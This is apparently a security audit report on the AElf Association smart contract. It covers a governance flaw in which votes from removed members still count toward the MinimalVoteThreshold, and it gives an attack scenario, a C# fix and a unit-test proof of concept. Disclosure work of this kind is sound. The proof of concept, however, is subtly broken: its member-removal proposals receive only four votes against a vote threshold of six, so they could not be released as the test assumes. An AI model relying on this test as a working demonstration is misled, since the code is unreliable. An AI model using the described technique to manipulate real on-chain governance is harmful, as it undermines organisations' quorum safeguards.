# Audit Report

## Title
Inconsistent Vote Counting Allows MinimalVoteThreshold Bypass Through Stale Votes from Removed Members

## Summary
The Association contract contains a critical vote counting inconsistency where approval/rejection/abstention counts filter by current membership, but the total vote count used for MinimalVoteThreshold validation does not. This allows proposals to pass using stale votes from members who were removed after voting, effectively bypassing governance participation requirements.

## Finding Description

The vulnerability exists in the threshold validation logic within the Association contract's proposal release mechanism.

When members vote on a proposal via `Approve()`, their address is added to the proposal's approval list. [1](#0-0) 

Members can later be removed from the organization through `RemoveMember()`, which removes them from `organization.OrganizationMemberList` but does NOT remove their votes from existing proposals. [2](#0-1) 

The root cause is an inconsistency in `CheckEnoughVoteAndApprovals()`:

**Approval counting (filtered):** The approval count filters by current membership, only counting votes from members still in the organization. [3](#0-2) 

**Total vote counting (NOT filtered):** The total vote count concatenates all approval/rejection/abstention lists without filtering by current membership. [4](#0-3) 

The same filtering pattern applies to rejections and abstentions, which also filter by current membership. [5](#0-4) [6](#0-5) 

This inconsistency means:
- Votes from removed members **DO NOT** count toward approval/rejection/abstention thresholds
- Votes from removed members **DO** count toward the MinimalVoteThreshold requirement

This breaks the governance security guarantee that MinimalVoteThreshold ensures adequate participation from current organization members.

## Impact Explanation

**Governance Security Control Bypass:** The MinimalVoteThreshold is a critical governance parameter designed to ensure adequate participation before proposals can execute. By allowing stale votes from removed members to count toward this threshold, the contract undermines this security control.

**Concrete Attack Scenario:**
- Organization has 10 members with MinimalVoteThreshold = 6 and MinimalApprovalThreshold = 4
- A proposal receives 4 approvals from current members (meeting approval threshold)
- 2 additional members vote (type irrelevant - approval/rejection/abstention)
- Through governance action, the organization removes those 2 members
- When Release() is called:
  - Current member approvals: 4 ≥ 4 ✓ (filtered count)
  - Total votes: 6 ≥ 6 ✓ (unfiltered count includes removed members)
  - Proposal executes successfully
- **Expected behavior:** With only 4 current member votes, it should fail MinimalVoteThreshold of 6

**Affected Parties:** All organizations using the Association contract for governance, particularly those with strict participation requirements. The vulnerability can be triggered both maliciously and unintentionally during normal member management operations.

**Severity Justification:** High - This directly violates the governance invariant that thresholds should reflect current member participation, allowing proposals to execute without meeting the intended quorum requirements.

## Likelihood Explanation

**Preconditions:**
- A proposal must be created and receive votes
- Members must then be removed from the organization

**Execution Path:**
The vulnerability requires `RemoveMember()` to be called, which is authorized only when `Context.Sender` equals the organization address (governance action). [7](#0-6) 

**Attack Vectors:**
1. **Malicious Collusion:** Multiple organization members coordinate to vote on a proposal, then use governance to remove some members to manipulate the threshold calculation
2. **Unintentional Trigger:** Legitimate member removal during normal operations (removing inactive members, organizational restructuring) after votes are cast inadvertently creates the vulnerability condition

**Practical Execution:** 
- Uses standard contract operations (vote methods, RemoveMember, Release)
- No special privileges required beyond normal organizational governance
- Can occur during routine member management without malicious intent

**Detection Difficulty:** The inconsistency is subtle and would not be apparent during normal operations. Organizations would not realize proposals are passing with insufficient current member participation unless they manually verify vote counts against current membership.

**Overall Probability:** Medium-High - While requiring governance action (not unilateral attacker control), this can occur through both malicious coordination and routine operational changes, making it a realistic threat to governance integrity.

## Recommendation

Modify `CheckEnoughVoteAndApprovals()` to filter the total vote count by current membership, ensuring consistency with how approval/rejection/abstention counts are calculated:

```csharp
private bool CheckEnoughVoteAndApprovals(ProposalInfo proposal, Organization organization)
{
    var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
    var isApprovalEnough =
        approvedMemberCount >= organization.ProposalReleaseThreshold.MinimalApprovalThreshold;
    if (!isApprovalEnough)
        return false;

    // Filter total votes by current membership
    var currentMemberVotes = proposal.Abstentions
        .Concat(proposal.Approvals)
        .Concat(proposal.Rejections)
        .Count(organization.OrganizationMemberList.Contains);
    
    var isVoteThresholdReached =
        currentMemberVotes >= organization.ProposalReleaseThreshold.MinimalVoteThreshold;
    return isVoteThresholdReached;
}
```

This ensures that only votes from current organization members count toward all threshold calculations, maintaining the governance invariant that thresholds reflect current member participation.

## Proof of Concept

```csharp
[Fact]
public async Task MinimalVoteThreshold_Bypass_Via_Removed_Members_Test()
{
    // Setup: Create organization with 10 members
    // MinimalVoteThreshold = 6, MinimalApprovalThreshold = 4
    var member4KeyPair = Accounts[4].KeyPair;
    var member5KeyPair = Accounts[5].KeyPair;
    var member4 = Accounts[4].Address;
    var member5 = Accounts[5].Address;
    
    var createOrganizationInput = new CreateOrganizationInput
    {
        OrganizationMemberList = new OrganizationMemberList
        {
            OrganizationMembers = { 
                DefaultSender, Reviewer1, Reviewer2, Reviewer3,
                member4, member5,
                Accounts[6].Address, Accounts[7].Address, 
                Accounts[8].Address, Accounts[9].Address 
            }
        },
        ProposalReleaseThreshold = new ProposalReleaseThreshold
        {
            MinimalApprovalThreshold = 4,
            MinimalVoteThreshold = 6,
            MaximalAbstentionThreshold = 0,
            MaximalRejectionThreshold = 0
        },
        ProposerWhiteList = new ProposerWhiteList
        {
            Proposers = { Reviewer1 }
        }
    };
    
    var organizationAddress = (await AssociationContractStub.CreateOrganization
        .SendAsync(createOrganizationInput)).Output;
    
    // Create a proposal
    var proposalId = await CreateProposalAsync(Reviewer1KeyPair, organizationAddress);
    
    // Step 1: Get 4 approvals from current members (meets approval threshold)
    await ApproveAsync(Reviewer1KeyPair, proposalId);
    await ApproveAsync(Reviewer2KeyPair, proposalId);
    await ApproveAsync(Reviewer3KeyPair, proposalId);
    await GetAssociationContractTester(DefaultSenderKeyPair).Approve.SendAsync(proposalId);
    
    // Step 2: Get 2 additional votes (to reach total of 6)
    await ApproveAsync(member4KeyPair, proposalId);
    await ApproveAsync(member5KeyPair, proposalId);
    
    // Verify proposal status: 6 total votes, should be releasable
    var proposal1 = await AssociationContractStub.GetProposal.CallAsync(proposalId);
    proposal1.ApprovalCount.ShouldBe(6);
    proposal1.ToBeReleased.ShouldBeTrue();
    
    // Step 3: Through governance, remove the 2 members who just voted
    var removeMember4Proposal = await CreateProposalAsync(Reviewer1KeyPair, organizationAddress,
        nameof(AssociationContractStub.RemoveMember), member4);
    await ApproveAsync(Reviewer1KeyPair, removeMember4Proposal);
    await ApproveAsync(Reviewer2KeyPair, removeMember4Proposal);
    await ApproveAsync(Reviewer3KeyPair, removeMember4Proposal);
    await GetAssociationContractTester(DefaultSenderKeyPair).Approve.SendAsync(removeMember4Proposal);
    await GetAssociationContractTester(Reviewer1KeyPair).Release.SendAsync(removeMember4Proposal);
    
    var removeMember5Proposal = await CreateProposalAsync(Reviewer1KeyPair, organizationAddress,
        nameof(AssociationContractStub.RemoveMember), member5);
    await ApproveAsync(Reviewer1KeyPair, removeMember5Proposal);
    await ApproveAsync(Reviewer2KeyPair, removeMember5Proposal);
    await ApproveAsync(Reviewer3KeyPair, removeMember5Proposal);
    await GetAssociationContractTester(DefaultSenderKeyPair).Approve.SendAsync(removeMember5Proposal);
    await GetAssociationContractTester(Reviewer1KeyPair).Release.SendAsync(removeMember5Proposal);
    
    // Step 4: Verify the vulnerability
    // After removing 2 members, only 4 current members have voted
    // MinimalVoteThreshold is 6, so it should FAIL
    // But due to the bug, stale votes from removed members still count
    var proposal2 = await AssociationContractStub.GetProposal.CallAsync(proposalId);
    
    // VULNERABILITY: Proposal still shows as releasable despite only 4 current member votes
    proposal2.ToBeReleased.ShouldBeTrue(); // This should be FALSE
    
    // The proposal can be released even though current member participation (4) < MinimalVoteThreshold (6)
    var releaseResult = await GetAssociationContractTester(Reviewer1KeyPair)
        .Release.SendAsync(proposalId);
    releaseResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // EXPECTED: Release should fail because only 4 current members voted (< 6 MinimalVoteThreshold)
    // ACTUAL: Release succeeds because removed members' votes still count toward total
}
```

### Citations

**File:** contract/AElf.Contracts.Association/Association.cs (L130-131)
```csharp
        proposal.Approvals.Add(Context.Sender);
        State.Proposals[input] = proposal;
```

**File:** contract/AElf.Contracts.Association/Association.cs (L266-280)
```csharp
    public override Empty RemoveMember(Address input)
    {
        var organization = State.Organizations[Context.Sender];
        Assert(organization != null, "Organization not found.");
        var removeResult = organization.OrganizationMemberList.OrganizationMembers.Remove(input);
        Assert(removeResult, "Remove member failed.");
        Assert(Validate(organization), "Invalid organization.");
        State.Organizations[Context.Sender] = organization;
        Context.Fire(new MemberRemoved
        {
            OrganizationAddress = Context.Sender,
            Member = input
        });
        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L36-38)
```csharp
        var rejectionMemberCount =
            proposal.Rejections.Count(organization.OrganizationMemberList.Contains);
        return rejectionMemberCount > organization.ProposalReleaseThreshold.MaximalRejectionThreshold;
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L43-44)
```csharp
        var abstentionMemberCount = proposal.Abstentions.Count(organization.OrganizationMemberList.Contains);
        return abstentionMemberCount > organization.ProposalReleaseThreshold.MaximalAbstentionThreshold;
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L49-51)
```csharp
        var approvedMemberCount = proposal.Approvals.Count(organization.OrganizationMemberList.Contains);
        var isApprovalEnough =
            approvedMemberCount >= organization.ProposalReleaseThreshold.MinimalApprovalThreshold;
```

**File:** contract/AElf.Contracts.Association/Association_Helper.cs (L55-57)
```csharp
        var isVoteThresholdReached =
            proposal.Abstentions.Concat(proposal.Approvals).Concat(proposal.Rejections).Count() >=
            organization.ProposalReleaseThreshold.MinimalVoteThreshold;
```
